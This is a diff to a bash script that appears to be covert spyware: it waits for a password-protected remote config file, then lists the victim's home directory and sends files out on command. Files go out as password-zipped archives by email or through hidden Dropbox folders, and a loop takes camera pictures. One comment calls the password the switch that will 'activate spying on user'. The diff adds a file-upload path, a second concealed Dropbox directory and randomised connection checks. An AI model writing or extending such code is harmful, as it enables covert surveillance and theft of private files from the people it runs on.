@@ -7,14 +7,16 @@ function check_connection {
 	# It would be better to ping google or yahoo or microsoft, or all at once.
 	#ping -q -w 1 -c 1 `ip r | grep default | cut -d ' ' -f 3` > /dev/null && CONNECTION_MODE=1 || CONNECTION_MODE=0
 	CONNECTION_MODE=0
-	ping -q -w 1 -c 1 www.google.com > /dev/null && CONNECTION_MODE=1 && return 0
-	ping -q -w 1 -c 1 www.yahoo.com > /dev/null && CONNECTION_MODE=1 && return 0
-	ping -q -w 1 -c 1 www.microsoft.com > /dev/null && CONNECTION_MODE=1 && return 0
-	`wget -q -O /dev/null --no-cache http://www.google.com/` && CONNECTION_MODE=1 && return 0
-	`wget -q -O /dev/null --no-cache http://www.yahoo.com/` && CONNECTION_MODE=1 && return 0
-	`wget -q -O /dev/null --no-cache http://www.microsoft.com/` && CONNECTION_MODE=1 && return 0
-	`wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
-	`wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
+	RAND_NUMB=`shuf -i 1-3 | head -1`
+	[ $RAND_NUMB -eq 1 ] && ping -q -w 1 -c 1 www.google.com > /dev/null && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 2 ] && ping -q -w 1 -c 1 www.yahoo.com > /dev/null && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 3 ] && ping -q -w 1 -c 1 www.microsoft.com > /dev/null && CONNECTION_MODE=1 && return 0
+	RAND_NUMB=`shuf -i 1-5 | head -1`
+	[ $RAND_NUMB -eq 1 ] && `wget -q -O /dev/null --no-cache http://www.google.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 2 ] && `wget -q -O /dev/null --no-cache http://www.yahoo.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 3 ] && `wget -q -O /dev/null --no-cache http://www.microsoft.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 4 ] && `wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 5 ] && `wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
 }
 
 function check_smtp {
@@ -48,12 +50,17 @@ function check_dir_size {
 		DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
 	done
 	[ $DIRSIZE -ge $3 ] && clean_dir $DIR_NAME
+	unset DIR_NAME
+	unset DIRSIZE
+	unset CLEAN_DIR_WHILE
 }
 
 function clean_dir {
 	file=`/bin/ls -1 "$1" | sort --random-sort | head -1`
 	path=`readlink --canonicalize "$1/$file"` # Converts to full path
 	rm "$path"
+	unset file
+	unset path
 }
 
 function remote_config {
@@ -71,10 +78,10 @@ function remote_config {
 		line_conf1=`echo $line_conf | cut -d : -f 1`
 		line_conf2=`echo $line_conf | cut -d : -f 1`
 		[ "$line_conf1" = "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1
-		[ "$line_conf1" = "listfiles" ] && [ $ACTIVATE -eq 1 ] && `find ~/>file_list.txt` && `zip -r tmp/filelist-$DATA.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g file_list.txt` && `mv tmp/filelist-$DATA.zip tosendlater/`
+		[ "$line_conf1" = "listfiles" ] && [ $ACTIVATE -eq 1 ] && `find ~/>file_list-$DATA.txt` && `zip -r tmp/file_list-$DATA.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g file_list-$DATA.txt` && `mv tmp/file_list-$DATA.zip tosendlater/`
 		[ "$line_conf1" = "filedata" ] && [ $ACTIVATE -eq 1 ] && echo "File data"
 		[ "$line_conf1" = "dirdata" ] && [ $ACTIVATE -eq 1 ] && echo "Dir data"
-		[ "$line_conf1" = "downloadfile" ] && [ $ACTIVATE -eq 1 ] && send_file "$line_conf2"
+		[ "$line_conf1" = "downloadfile" ] && [ $ACTIVATE -eq 1 ] && remote_send_file "$line_conf2"
 		[ "$line_conf1" = "delfile" ] && [ $ACTIVATE -eq 1 ] && echo "Delete $line_conf2"
 		# post other options here
 		done < $REMOTE_CONFIG_NAME
@@ -85,13 +92,24 @@ function remote_config {
 	unset MD5NEW
 }
 
-function send_file {
+function remote_send_file {
 	FILESIZE=`du -s "$1" | cut -f 1`
 	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
 	FILE_NAME_sf="filerequest-$DATA-$RANDOM"
-	[ $FILESIZE -le $MAX_ATACHEMENT_SIZE ] && `zip -r tmp/$FILE_NAME_sf.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g "$1"` && `mv tmp/$FILE_NAME_sf.zip tosendlater/`
-	[ $SMTP_CONNECTION -eq 1 ] && run_send_later
-	[ $R_DB -eq 1 ] && run_dropbox
+	if [ $FILESIZE -le $MAX_ATACHEMENT_SIZE ]
+	then
+		zip -r "tmp/$FILE_NAME_sf.zip" -P 42p6b2V3hy7c92g42p6b2V3hy7c92g "$1"
+		[ $SMTP_CONNECTION -eq 1 ] && fsendemail "SendRequestedFile - $DATA" "Requested file" "$FILENAME"
+		[ $R_SCP -eq 1 ] && run_scp "tmp/$FILE_NAME_sf.zip"
+		[ $R_FTP -eq 1 ] && run_ftp "tmp/$FILE_NAME_sf.zip"
+		[ $R_DB -eq 1 ] && run_dropbox_file "$1"
+		[ -f "tmp/$FILE_NAME_sf.zip" ] && mv "tmp/$FILE_NAME_sf.zip" tosendlater/
+	else
+		# What to do, when file is greater than max attachement size.
+		[ $R_SCP -eq 1 ] && run_scp "$1"
+		[ $R_FTP -eq 1 ] && run_ftp "$1"
+		[ $R_DB -eq 1 ] && run_dropbox_file "$1"
+	fi
 	unset FILESIZE
 	unset FILE_NAME_sf
 }
@@ -104,6 +122,21 @@ function run_send_later {
 function run_dropbox {
 	./a_up_dropbox.sh $DB_DIR "tosendlater" $DB_DIR_MAX_SIZE $DIR_MAX_SIZE
 }
+
+function run_dropbox_file {
+	cp -u "$1" "$DB_DIR2/"
+}
+
+function run_scp {
+	# 1-file
+	echo "Send file $1 by SCP, not yeat implemented."
+}
+
+function run_ftp {
+	# 1-file
+	echo "Send file $1 by FTP, not yeat implemented."
+}
+
 
 ################
 # Variables
@@ -155,6 +188,11 @@ R_FTP=0 # FTP
 # Dropbox directory, from script point of view
 DB_DIR="../Dropbox/.config"
 DB_DIR=`readlink --canonicalize "$DB_DIR"`
+# Another DB DIR which is used to upload files requested by you via remote_manager, when they are bigger than Max_Attachement_Size
+DB_DIR2="../Dropbox/.config-other"
+DB_DIR2=`readlink --canonicalize "$DB_DIR2"`
+mkdir $DB_DIR
+mkdir $DB_DIR2
 
 # When we should start remove random files from tosendlater dir
 DIR_WARNING_SIZE=20000 # 20mb
@@ -172,7 +210,7 @@ REMOTE_CONFIG_ADDRESS="www.google.com" # Address to dir containing file
 REMOTE_CONFIG_NAME="WATCHER.cfg" # File name
 REMOTE_ACTIVATION_PASS="PASS" # Password (it should be placed at the top of config file), it will activate spying on user if you decoded so
 REMOTE_CHECK_EVERY=10 # check every 10 passes, for special commands
-REMOTE_WAIT_TO_NEXT_CHECK=1800
+REMOTE_WAIT_TO_NEXT_CHECK=1800 # If the script is running
 
 
 ################
@@ -182,13 +220,18 @@ sleep $T_INITIAL_DELAY
 
 
 ################
-# Check for remote file config if necessary
+# Check for connection, remote file config if necessary, smtp
 ########
-[ $REMOTE_CONFIG -eq 3 ] && remote_config
-[ $REMOTE_CONFIG -eq 2 ] && remote_config && ACTIVATE=1
-[ $REMOTE_CONFIG -eq 1 ] && remote_config
-[ $REMOTE_CONFIG -eq 0 ] && ACTIVATE=1
-[ $ACTIVATE -eq 0 ] && exit 0;
+check_connection
+if [ $CONNECTION_MODE -eq "1" ]
+then
+	[ $REMOTE_CONFIG -eq 3 ] && remote_config
+	[ $REMOTE_CONFIG -eq 2 ] && remote_config && ACTIVATE=1
+	[ $REMOTE_CONFIG -eq 1 ] && remote_config
+	[ $REMOTE_CONFIG -eq 0 ] && ACTIVATE=1
+	[ $ACTIVATE -eq 0 ] && exit 0;
+fi
+check_smtp
 
 
 ################
@@ -201,8 +244,6 @@ sleep $T_INITIAL_DELAY
 ################
 # Loop begins
 ########
-check_connection
-check_smtp
 while true
 do
 	start_time=$(date +%s)
@@ -273,6 +314,7 @@ do
 			./camera.sh 0 1
 		fi
 		run_send_later
+		[[ $? -ge 1 ]] && CONNECTION_SMTP=0
 	else
 		# When no smtp or connection was established - uncomment if you want to make pictures offline
 		#if [ $((CAM_COUNTER)) -ge $((T_CAM_EVERY)) ]
